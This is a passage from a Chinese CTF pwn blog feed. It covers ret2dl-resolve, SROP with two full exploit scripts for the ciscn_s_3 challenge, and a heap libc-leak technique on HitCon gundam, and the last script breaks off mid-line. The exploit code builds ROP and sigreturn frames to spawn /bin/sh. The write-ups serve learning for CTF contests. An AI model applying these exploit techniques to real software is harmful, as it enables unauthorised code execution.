class="line">payload2 += <span class="string">'B'</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">"system\x00"</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>同时，我们还可以通过pwntools 的Ret2dlresolvePayload来自动完成需要手动的伪造步骤：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./bof'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">"./bof"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./bof"</span>) </span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf, symbol=<span class="string">"system"</span>, args=[<span class="string">"/bin/sh"</span>]) </span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr) </span><br><span class="line">rop.ret2dlresolve(dlresolve) </span><br><span class="line">raw_rop = rop.chain() </span><br><span class="line">print(rop.dump())</span><br><span class="line">print(hex(dlresolve.data_addr))</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">112</span> </span><br><span class="line">payload += raw_rop </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload= dlresolve.payload</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.3_pwn_xdctf2015_pwn200.html" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.3_pwn_xdctf2015_pwn200.html</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/</a></p><p><a href="https://github.com/datajerk/ctf-write-ups/blob/master/umdctf2021/jie-jne-jnw/exploit-jie.py" target="_blank" rel="noopener">https://github.com/datajerk/ctf-write-ups/blob/master/umdctf2021/jie-jne-jnw/exploit-jie.py</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在做一道题时,感觉很像ret2dl-resolve能解的,但是最后发现是自己太菜理念不清搞错解题方向ret2dl-resolve并不能解。所以写文重新温习下ret2dl-resolve,防止下次踩坑。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>系统调用与SROP方法学习笔记</title>
    <link href="lexsd6.github.io/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>lexsd6.github.io/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-05-20T14:26:02.525Z</published>
    <updated>2021-05-21T04:29:39.075Z</updated>
    
    <content type="html"><![CDATA[<p>最近在刷题时,遇到很多关于没有或很少调用libc函数但使用了系统调用的题目,这些题目常常可以利用SROP的方法来解决，因此写个笔记来总结归纳下SROP利用原理与过程.<a id="more"></a></p><h2 id="SROP-特点与原理"><a href="#SROP-特点与原理" class="headerlink" title="SROP 特点与原理"></a>SROP 特点与原理</h2><h3 id="SROP-特点"><a href="#SROP-特点" class="headerlink" title="SROP 特点"></a>SROP 特点</h3><p>依赖系统调用(syscal)强但对libc.so的依赖极少。</p><p>要有空间存放Signal Frame的信息.</p><p>与其他rop相比，对的依赖gadgets 较少。</p><h3 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h3><p>SROP手段十分依赖signal 机制.而signal 机制是类 unix 系统中进程之间相互传递信息的一种方法，也是我们平常所说的软中断或软信号中断。</p><p>1.内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。<strong>内核会为该进程保存相应的上下文，主要是将所有寄存器以及压入 signal 信息和指向 sigreturn 的系统调用地址压入栈中。</strong>我们称 ucontext 以及 siginfo 这一段为 Signal Frame(此时栈的结构如下图所示)。然后处理signal handler 的事务.<img src="image-20210520224507291.png" alt="image-20210520224507291"></p><p>处理完signal handler 的事务.程序处理完会return回<code>__restore_rt，</code>这个功能里面就是<code>mov rax, 0xf; syscall</code>，去呼叫<code>sys_rt_sigreturn</code>syscall，把一部分恢复Signal Frame通过解析 Signal Frame的信息，将压入的进程还原成中断前的状态。</p><p><img src="image-20210521095432564.png" alt="image-20210521095432564"></p><p>同时,对于signal Frame来说，不同会因为架构的不同而因此有所区别.</p><h4 id="signal-Frame-sigcontext"><a href="#signal-Frame-sigcontext" class="headerlink" title="signal Frame sigcontext"></a>signal Frame sigcontext</h4><p>在32位lunix 下sigcontext 的结构为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> short gs, __gsh;</span><br><span class="line"><span class="keyword">unsigned</span> short fs, __fsh;</span><br><span class="line"><span class="keyword">unsigned</span> short es, __esh;</span><br><span class="line"><span class="keyword">unsigned</span> short ds, __dsh;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> edi;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> esi;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> ebp;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> esp;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> ebx;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> edx;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> ecx;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> eax;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> trapno;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> err;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> eip;</span><br><span class="line"><span class="keyword">unsigned</span> short cs, __csh;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> esp_at_signal;</span><br><span class="line"><span class="keyword">unsigned</span> short ss, __ssh;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> oldmask;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在64位lunix 下sigcontext 的结构为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">      <span class="keyword">__uint16_t</span>        cwd;</span><br><span class="line">      <span class="keyword">__uint16_t</span>        swd;</span><br><span class="line">      <span class="keyword">__uint16_t</span>        ftw;</span><br><span class="line">      <span class="keyword">__uint16_t</span>        fop;</span><br><span class="line">      <span class="keyword">__uint64_t</span>        rip;</span><br><span class="line">      <span class="keyword">__uint64_t</span>        rdp;</span><br><span class="line">      <span class="keyword">__uint32_t</span>        mxcsr;</span><br><span class="line">      <span class="keyword">__uint32_t</span>        mxcr_mask;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">      <span class="keyword">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">      <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">      <span class="keyword">unsigned</span> short cs;</span><br><span class="line">      <span class="keyword">unsigned</span> short gs;</span><br><span class="line">      <span class="keyword">unsigned</span> short fs;</span><br><span class="line">      <span class="keyword">unsigned</span> short __pad0;</span><br><span class="line">      <span class="keyword">__uint64_t</span> err;</span><br><span class="line">      <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">      <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">      <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">      __extension__ <span class="keyword">union</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">          <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">        &#125;;</span><br><span class="line">      <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>用图片来形容X64的sigcontext 的结构应该如下表示:</p><p><img src="image-20210521095910046.png" alt="image-20210521095910046"></p><h3 id="SROP-原理"><a href="#SROP-原理" class="headerlink" title="SROP 原理"></a>SROP 原理</h3><p>在程序某一个地方伪造一个<code>signal Frame</code>,再让程序<code>sys_rt_sigreturn</code>我们构造的fake signal Frame.让进程恢复到我们构造的恶意状态.</p><p><img src="image-20210521101741135.png" alt="image-20210521101741135"></p><h2 id="常用系统调用号"><a href="#常用系统调用号" class="headerlink" title="常用系统调用号"></a>常用系统调用号</h2><h3 id="i386"><a href="#i386" class="headerlink" title="i386"></a>i386</h3><table><thead><tr><th>NR</th><th>syscall name</th><th>%eax</th><th>arg0 (%ebx)</th><th>arg1 (%ecx)</th><th>arg2 (%edx)</th></tr></thead><tbody><tr><td>3</td><td>read</td><td>0x03</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td></tr><tr><td>4</td><td>write</td><td>0x04</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td></tr><tr><td>5</td><td>open</td><td>0x05</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td></tr><tr><td>11</td><td>execve</td><td>0x0b</td><td>const char *filename</td><td>char *const *argv</td><td>char *const *envp</td></tr><tr><td>173</td><td>rt_sigreturn</td><td>0xad</td><td>?</td><td>?</td><td>?</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;int execve(const char *pathname, char *const argv[],char *const envp[]);</span><br><span class="line">173i386rt_sigreturnsys_rt_sigreturnstub32_rt_sigreturn</span><br><span class="line">&#x2F;&#x2F; mov  eax 0xad</span><br><span class="line">&#x2F;&#x2F;syscall</span><br><span class="line">&#x2F;&#x2F;retn   Signal Frame addr</span><br></pre></td></tr></table></figure><h3 id="amd64"><a href="#amd64" class="headerlink" title="amd64"></a>amd64</h3><table><thead><tr><th>NR</th><th align="center">syscall name</th><th>%rax</th><th>arg0 (%rdi)</th><th>arg1 (%rsi)</th><th>arg2 (%rdx)</th></tr></thead><tbody><tr><td>0</td><td align="center">read</td><td>0x00</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td></tr><tr><td>1</td><td align="center">write</td><td>0x01</td><td>unsigned int fd</td><td>const char *buf</td><td></td></tr><tr><td>2</td><td align="center">open</td><td>0x02</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td></tr><tr><td>3</td><td align="center">rt_sigreturn</td><td>0x0f</td><td>?</td><td>?</td><td>?</td></tr><tr><td>59</td><td align="center">execve</td><td>0x3b</td><td>const char *filename</td><td>char *const *argv</td><td>char *const *envp</td></tr></tbody></table><h2 id="例题ciscn-s-3"><a href="#例题ciscn-s-3" class="headerlink" title="例题ciscn_s_3"></a>例题ciscn_s_3</h2><p><img src="image-20210521114438090.png" alt="image-20210521114438090"></p><p>这个题目很奇怪,我ida无法F5,然后自己手撕汇编.</p><p><img src="image-20210521115053077.png" alt="image-20210521115053077"></p><p>程序只调用的系统调用而没有调用libc函数.在程序运行的流程中调用系统调用来读入数据到buf,但buf数据只有0x10大小，所以存在栈溢出。然后，接下来调用系统调用来显示数据，但同样存在输出数据范围大于buf于是存在信息泄露。</p><h3 id="解法1-execve与libc-csu-init"><a href="#解法1-execve与libc-csu-init" class="headerlink" title="解法1:execve与libc_csu_init"></a>解法1:execve与libc_csu_init</h3><p>用利用题目中<code>mov     rax, 3Bh;ret</code>gatget来修改rax为0x3b，同时利用libc_csu_init来修改rdx为0，用<code>pop rdi;ret</code>来修改rdi 的值指向<code>/bin/sh</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">context.arch = e.arch</span><br><span class="line">p=process(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*(<span class="number">0x10</span>-len(<span class="string">'/bin/sh\x00'</span>))+p64(<span class="number">0x0000000004004F1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sgdb.attach(p)</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">add=p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">print(hex(u64(add)<span class="number">-0x110</span>))</span><br><span class="line">stack=u64(add)<span class="number">-0x110</span></span><br><span class="line">log.info(<span class="string">'stack:'</span>+hex(stack))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">rax=<span class="number">0x0000000004004E2</span>  <span class="comment">#mov     rax, 3Bh;ret</span></span><br><span class="line">libc_csu_init_gat1=<span class="number">0x00000000040059A</span></span><br><span class="line">libc_csu_init_gat2=<span class="number">0x000000000400580</span></span><br><span class="line">rdi_ret=<span class="number">0x00000000004005a3</span><span class="comment"># pop rdi;ret</span></span><br><span class="line">syscall_ret=<span class="number">0x0000000000400517</span><span class="comment"># syscall ; ret</span></span><br><span class="line"></span><br><span class="line">pay=<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*(<span class="number">0x10</span>-len(<span class="string">'/bin/sh\x00'</span>))+p64(rax)+p64(libc_csu_init_gat1)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(stack+<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc_csu_init_gat2)+<span class="string">'a'</span>*<span class="number">0x38</span>+p64(rdi_ret)+p64(stack)+p64(syscall_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="解法2：srop"><a href="#解法2：srop" class="headerlink" title="解法2：srop"></a>解法2：srop</h3><p>同样我们可以利用srop，在栈中部署一个伪造signal Frame sigcontext，然后用rt_sigreturn来恶意恢复重而get shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">context.arch = e.arch</span><br><span class="line"><span class="comment">#p=remote('node3.buuoj.cn',27681)</span></span><br><span class="line">p=process(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">vuln=<span class="number">0x0000000004004F1</span> <span class="comment">#</span></span><br><span class="line">pay=<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*(<span class="number">0x10</span>-len(<span class="string">'/bin/sh\x00'</span>))+p64(<span class="number">0x0000000004004F1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sgdb.attach(p)</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">add=p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">print(hex(u64(add)<span class="number">-0x110</span>))</span><br><span class="line">stack=u64(add)<span class="number">-0x110</span></span><br><span class="line">log.info(<span class="string">'stack:'</span>+hex(stack))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">syscall_ret=<span class="number">0x0000000000400517</span><span class="comment"># syscall ; ret</span></span><br><span class="line">rax=<span class="number">0x0000000004004DA</span>  <span class="comment">#mov     rax, 0Fh;ret</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = stack</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_ret</span><br><span class="line">pay=<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*(<span class="number">0x10</span>-len(<span class="string">'/bin/sh\x00'</span>))+p64(rax)+p64(syscall_ret)+str(frame)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md" target="_blank" rel="noopener">系统调用号</a></p><p><a href="https://ctf-wiki.org/pwn/linux/stackoverflow/advanced-rop/srop/" target="_blank" rel="noopener">https://ctf-wiki.org/pwn/linux/stackoverflow/advanced-rop/srop/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在刷题时,遇到很多关于没有或很少调用libc函数但使用了系统调用的题目,这些题目常常可以利用SROP的方法来解决，因此写个笔记来总结归纳下SROP利用原理与过程.</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn堆题泄露libc真实地址小tirck</title>
    <link href="lexsd6.github.io/2021/05/02/heap%E6%B3%84%E9%9C%B2%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80tirck/"/>
    <id>lexsd6.github.io/2021/05/02/heap%E6%B3%84%E9%9C%B2%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80tirck/</id>
    <published>2021-05-02T10:50:25.221Z</published>
    <updated>2021-05-04T03:42:08.473Z</updated>
    
    <content type="html"><![CDATA[<p>在做pwn时,一直烦扰我的是本地打通了,远程打不通的情况。这情况在做堆题时印象最为深刻，因为在做堆题我们往往只能从附件或提示中得到题目环境的libc的大版本，导致我们在计算偏移时会与远程存在差异。因此本文从本地泄露地址讲起，如何避免偏移libc版本地址偏移差异导致功亏一篑。<a id="more"></a></p><h2 id="本地地址泄露方法"><a href="#本地地址泄露方法" class="headerlink" title="本地地址泄露方法"></a>本地地址泄露方法</h2><p>我们以2018-HitCon-Pwn-gundam来分析下，题目保护如下：</p><p><img src="image-20210503234633625.png" alt="image-20210503234633625"></p><blockquote><p>由于linux中使用<code>free()</code>进行内存释放时，不大于 <code>max_fast</code> （默认值为 64B）的 chunk 被释放后，首先会被放到 <code>fast bins</code>中，大于<code>max_fast</code>的chunk或者<code>fast bins</code> 中的空闲 chunk 合并后会被放入<code>unsorted bin</code>中。而在fastbin为空时，<code>unsortbin</code>的fd和bk指向自身<code>main_arena</code>中，该地址的相对偏移值存放在libc.so中，可以通过use after free后打印出<code>main_arena</code>的实际地址，结合偏移值从而得到libc的加载地址。</p></blockquote><p>所以我们在做堆题时，通常都是我们想办法构造出一个大于0x90的chunk来free掉加入unsorted bin，获得一个在<code>main_arena</code>相近的值从而得到<code>main_arena</code>的真实地址。再通过gdb  vmmap 得到libc的基地址.</p><p><img src="image-20210503232104347.png" alt="image-20210503232104347"></p><p>再继续通过gdb寻找<code>__free_hook</code>、<code>__malloc__hook</code>、<code>system</code>这些敏感symbols的地址，计算出他们与libc基地址偏移。</p><p><img src="image-20210503232436354.png" alt="image-20210503232436354"></p><p>这样在同一个环境中，就算开了保护 libc.so 动态链接库中的symbols与libc 基地址相对偏移是固定的。我们得到了unsorted bin就可以得到所有我们想要的地址。</p><p><img src="image-20210503234159126.png" alt="image-20210503234159126"></p><p>这样方法写出的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote('challenge-6759487098ea2b0b.sandbox.ctfhub.com',23648)</span></span><br><span class="line">p=process(<span class="string">'./gundam'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Destory:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blow_up</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">free(i)</span><br><span class="line">blow_up()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x4</span>)</span><br><span class="line">build(<span class="string">'B'</span>*<span class="number">7</span>)</span><br><span class="line">blow_up()</span><br><span class="line">visit()</span><br><span class="line">addr = (p.recvuntil(<span class="string">"Type[7]"</span>,drop=<span class="literal">True</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">print(hex(u64(addr)))</span><br><span class="line">base=u64(addr)<span class="number">-0x3afca0</span></span><br><span class="line">print(hex(base))</span><br><span class="line">free_hook=base+<span class="number">0x3b18e8</span></span><br><span class="line">print(<span class="string">'4'</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">blow_up()</span><br><span class="line">free(<span class="number">2</span>)</span><br><span 